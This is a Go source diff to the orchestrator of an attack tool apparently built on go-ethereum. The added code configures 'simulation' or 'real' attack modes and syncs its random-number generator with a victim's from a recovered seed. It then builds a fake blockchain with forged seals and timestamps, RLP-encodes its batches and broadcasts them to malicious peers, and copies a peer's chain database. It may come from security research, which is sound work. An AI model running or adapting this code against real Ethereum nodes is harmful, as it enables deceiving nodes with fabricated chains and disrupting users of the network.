@@ -6,7 +6,14 @@ import "time"
 import "sync"
 import "bytes"
 import "encoding/binary"
+import "strconv"
+import "strings"
+import "os"
+import "os/exec"
 import mrand "math/rand"
+import dircopy "github.com/otiai10/copy"
+import "github.com/ethereum/go-ethereum/rlp"
+import "github.com/ethereum/go-ethereum/core/types"
 import "github.com/ethereum/go-ethereum/attack/buildchain"
 import "github.com/ethereum/go-ethereum/attack/msg"
 import "github.com/ethereum/go-ethereum/attack/utils"
@@ -18,6 +25,7 @@ const (
 var (
 	port = "45678"
 	seed_port = "65432"
+	mgethDir string
 )
 
 type Orchestrator struct {
@@ -42,7 +50,21 @@ type Orchestrator struct {
 	seed int32
 	done chan struct{}
 	rand *mrand.Rand
+	prngSteps map[int]int
+	prngTuned chan struct{}
+	Tm int
+	fraction float64
+}
 
+type OrchConfig struct {
+	Rebuild bool
+	Port string
+	PredictionOnly bool
+	ShortPrediction bool
+	OverriddenSeed int
+	AtkMode string
+	Tm int
+	Fraction float64
 }
 
 func New(errc chan error) *Orchestrator {
@@ -67,17 +89,19 @@ func New(errc chan error) *Orchestrator {
 		requiredOracleBits: utils.RequiredOracleBits,
 		seed: int32(-1),
 		done: make(chan struct{}),
+		prngSteps: map[int]int{1:0, 100:0},
+		prngTuned: make(chan struct{}),
 	}
 
 	return o
 }
 
-func (o *Orchestrator) Start(rebuild bool, port string, predictionOnly, shortPrediction bool, overriddenSeed int) {
+func (o *Orchestrator) Start(cfg *OrchConfig) {
 	go o.handleMessages()
-	go o.addPeers(port)
+	go o.addPeers(cfg.Port)
 	go func() {
 		predictionChainLength := utils.NumBatchesForPrediction*utils.BatchSize + 88
-		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, rebuild, 0, false)
+		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, cfg.Rebuild, 0, false, nil)
 		if err != nil {
 			o.errc <- err
 			o.close()
@@ -86,20 +110,30 @@ func (o *Orchestrator) Start(rebuild bool, port string, predictionOnly, shortPre
 		o.chainBuilt = true
 	}()
 
-	o.predictionOnly = predictionOnly
+	o.predictionOnly = cfg.PredictionOnly
 
-	if shortPrediction {
+	if cfg.ShortPrediction {
 		o.requiredOracleBits = 3
 		o.seed = int32(1)
 	}
 
-	if overriddenSeed >= 0 {
-		o.seed = int32(overriddenSeed)
+	if cfg.OverriddenSeed >= 0 {
+		o.seed = int32(cfg.OverriddenSeed)
 	}
 
 	if o.localMaliciousPeers {
 		//TODO: Start two peers with 'mgeth'
 	}
+
+	if cfg.AtkMode=="real" {
+		buildchain.SetRealMode()
+	} else if cfg.AtkMode!="simulation" {
+		o.errc <- fmt.Errorf("Invalid attack mode: %s", cfg.AtkMode)
+		return
+	}
+
+	o.Tm = cfg.Tm
+	o.fraction = cfg.Fraction
 
 	fmt.Println("Orchestrator started")
 }
@@ -218,13 +252,13 @@ func (o *Orchestrator) leadAttack() {
 					break
 				}
 				time.Sleep(100*time.Millisecond)
-				fmt.Println("Sleeping...")
+				//fmt.Println("Sleeping...")
 			}
 			o.sendAll(msg.LastOracleBit)
 
-			fmt.Println("Writing to o.syncCh")
+			//fmt.Println("Writing to o.syncCh")
 			o.syncCh <- struct{}{}
-			fmt.Println("Wrote to o.syncCh")
+			//fmt.Println("Wrote to o.syncCh")
 		}
 		if len(oracleReply)==o.requiredOracleBits {
 			fmt.Println("Leaked bitstring:", oracleReply)
@@ -251,10 +285,22 @@ func (o *Orchestrator) leadAttack() {
 		return
 	}
 
+	<-o.syncCh
+	/*
 	o.attackPhase = utils.SyncPhase
 	fmt.Println("Started", o.attackPhase, "phase")
+	*/
 
-	// From here on, we develop the second phase of the attack
+
+
+	// --- SYNC PHASE ---
+
+	err := o.send(o.peerset.masterPeer, msg.GetCwd)
+	if err != nil {
+		fmt.Println("Couldn't get current working directory of master peer")
+		o.errc <- err
+		return
+	}
 	
 	o.rand = mrand.New(mrand.NewSource(int64(o.seed)))
 
@@ -262,6 +308,7 @@ func (o *Orchestrator) leadAttack() {
 	go func() {
 		for i := 0; i < 2*utils.NumBatchesForPrediction*o.requiredOracleBits; i++ {
 			r := o.rand.Intn(100)
+			o.prngSteps[100]++
 			// Print a few values for testing
 			if i < 2 {
 				fmt.Print(r, " ")
@@ -270,9 +317,115 @@ func (o *Orchestrator) leadAttack() {
 		fmt.Println("")
 	}()
 
+	pyInterpreterBytes, err := exec.Command("which", "python").Output()
+	if err != nil {
+		py3InterpreterBytes, err2 := exec.Command("which", "python3").Output()
+		if err2 != nil {
+			fmt.Println("Couldn't find python interpreter")
+			o.errc <- fmt.Errorf("err1: %w, err2: %w", err, err2)
+			return
+		} else {
+			pyInterpreterBytes = py3InterpreterBytes
+		}
+	}
+	pyInterpreter := string(pyInterpreterBytes)
+	pyInterpreter = strings.Trim(pyInterpreter, "\r\n")
+
+	optimizeScript, err := getOptimizeScriptPath()
+	if err != nil {
+		fmt.Println("Couldn't get optimize script path")
+		o.errc <- err
+		return
+	}
+	
+	outputFile := "strategy.txt"
+	cmd := exec.Command(pyInterpreter, optimizeScript, "--time", strconv.Itoa(o.Tm),
+						"--fraction", strconv.FormatFloat(o.fraction, 'f', -1, 64), "--export", outputFile)
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println("Couldn't run optimization script")
+		o.errc <- err
+		return
+	}
+	
+	// TODO: Tune the PRNG
+
+	<-o.prngTuned
+
+	// Now, account for next 11 honest batches
+	fmt.Println("Accounting for 11 repeated batches")
+	for i := 0; i < 2*11; i++ {
+		fmt.Printf("%d ", o.rand.Intn(100))
+		o.prngSteps[100]++
+	}
+	fmt.Println("")
+
+
+	//TODO: RE-ENABLE block below for non-testing
+	/*
+	bp, err := buildchain.GenerateBuildParameters(o.Tm, outputFile, o.rand)
+	if err != nil {
+		fmt.Println("Could not generate build parameters for fake chain")
+		o.errc <- err
+		return
+	}
+	*/
+
+	// We change bp only for testing purposes. Remove the line below later on.
+	bp := buildchain.BuildParametersForTesting(o.rand)
+
+	buildchain.SetSeals(bp.SealsMap)
+	buildchain.SetTimestampDeltas(bp.TimestampDeltasMap)
+
+	errc := make(chan error)
+	results := make(chan types.Blocks)
+	go func() {
+		errc <- buildchain.BuildChain(utils.FakeChain, bp.NumBatches*utils.BatchSize + utils.MinFullyVerifiedBlocks,
+									  false, 0, false, results) 
+	}()
+
+	loop:
+	for {
+		select {
+		case result := <-results:
+			errb := o.broadcastFakeBatch(result)
+			if errb != nil {
+				o.errc <- errb
+				return
+			}
+		case err := <-errc:
+			if err != nil {
+				fmt.Println("Couldn't build fake chain")
+				o.errc <- err
+				return
+			}
+			break loop
+		}
+	}
+	select {
+		case result := <-results:
+			errb := o.broadcastFakeBatch(result)
+			if errb != nil {
+				o.errc <- errb
+				return
+			}
+		default:
+	}
+	close(results)
+	close(errc)
+
+	err = o.sendAll(msg.FakeBatch.SetContent(nil))
+	if err != nil {
+		fmt.Println("Couldn't notify end of fake batches")
+		o.errc <- err
+		return
+	}
+
 	<-o.done 	// Wait for the attack to finish
 
 
+
+	// --- DELIVERY PHASE ---
 
 	o.errc <- nil
 }
@@ -338,6 +491,46 @@ func recoverSeed(bitstring []byte) (int32, error) {
 	return seed, nil
 }
 
+func getOptimizeScriptPath() (string, error) {
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return "", err
+	}
+	pathSeparator := string(os.PathSeparator)
+	path := home + pathSeparator + "scripts" + pathSeparator + "optimization.py"
+	return path, nil
+}
+
+func (o *Orchestrator) broadcastFakeBatch(blocks types.Blocks) error {
+	// var rlpBlocks []rlp.RawValue
+	// var err error
+	/*
+	for _, b := range blocks {
+		rlpData, err := rlp.EncodeToBytes(b)
+		if err != nil {
+			fmt.Printf("Couldn't RLP-encode fake block #%d\n", b.NumberU64())
+			return err
+		}
+		rlpBlocks = append(rlpBlocks, rlpData)
+	}
+	*/
+
+	rlpBlocks, err := rlp.EncodeToBytes(blocks)
+	if err != nil {
+		fmt.Printf("Couldn't RLP-encode fake batch #%d - #%d\n", blocks[0].NumberU64(), blocks[len(blocks)-1].NumberU64())
+		return err
+	}
+	content := make([]byte, 4)
+	binary.BigEndian.PutUint32(content, uint32(len(blocks)))
+	content = append(content, rlpBlocks...)
+	err = o.sendAll(msg.FakeBatch.SetContent(content))
+	if err != nil {
+		fmt.Println("Couldn't broadcast fake batch to malicious peers")
+		return err
+	}
+	return nil
+}
+
 func (o *Orchestrator) handleMessages() {
 	for {
 		select {
@@ -380,9 +573,10 @@ func (o *Orchestrator) handleMessages() {
 					for !o.masterPeerSet {
 						time.Sleep(10*time.Millisecond)
 					}
-					if o.syncOps == o.requiredOracleBits /*&& !o.syncChRead*/ {
+					if o.syncOps == o.requiredOracleBits {
 						<-o.syncCh
-						o.syncChRead = true
+					} else if o.syncOps == o.requiredOracleBits+1 {
+						o.syncCh <- struct{}{}
 					}
 					err := o.sendAllExcept(message, sender)
 					if err != nil {
@@ -450,12 +644,68 @@ func (o *Orchestrator) handleMessages() {
 				go func() {
 					for i:=0; i < steps_100; i++ {
 						o.rand.Intn(100)
+						o.prngSteps[100]++
 					}
 					for i:=0; i < steps_1; i++ {
 						o.rand.Intn(1)
+						o.prngSteps[1]++
 					}
-					fmt.Println("PRNG synced with victim")
+					fmt.Printf("PRNG synced with victim (100: %d, 1: %d)\n", o.prngSteps[100], o.prngSteps[1])
+					o.prngTuned <- struct{}{}
 				}()
+			case msg.OriginalHead.Code:
+				size := uint64(len(message.Content))
+				s := rlp.NewStream(bytes.NewReader(message.Content), size)
+				head := new(types.Header)
+				if err := s.Decode(head); err != nil {
+					fmt.Println("Couldn't decode original head")
+					o.errc <- err
+					o.close()
+					return
+				}
+				buildchain.SetOriginalHead(head)
+				go func() {
+					height := head.Number.Uint64()
+					fmt.Printf("Pre-building DAG at block #%d in background\n", height)
+					err := buildchain.PrebuildDAG(height)
+					if err != nil {
+						fmt.Println("Pre-building DAG failed")
+						o.errc <- err
+						o.close()
+						return
+					}
+					fmt.Printf("Pre-built DAG at block #%d\n", height)
+
+					separator := string(os.PathSeparator)
+					srcPath := mgethDir + separator + "datadir" + separator + "geth" + separator + "chaindata"
+					home, err := os.UserHomeDir()
+					if err != nil {
+						o.errc <- err
+						o.close()
+						return
+					}
+					fakeChainDbPath := home + separator + ".buildchain" + separator + utils.FakeChain.GetDir()
+					err = os.RemoveAll(fakeChainDbPath)
+					if err != nil {
+						fmt.Println("Couldn't clean fake chain DB directory")
+						o.errc <- err
+						o.close()
+						return
+					}
+					err = dircopy.Copy(srcPath, fakeChainDbPath)
+					if err != nil {
+						fmt.Println("Couldn't copy peer's chaindata to buildchain directory")
+						o.errc <- err
+						o.close()
+						return
+					}
+					fmt.Println("Peer's database copied into buildchain tool")
+
+				}()
+			case msg.Cwd.Code:
+				mgethDir = string(message.Content)
+				buildchain.SetMgethDir(mgethDir)
+
 
 			// Default policy: relay the message among peers if no particular action by the orch is needed
 			default:
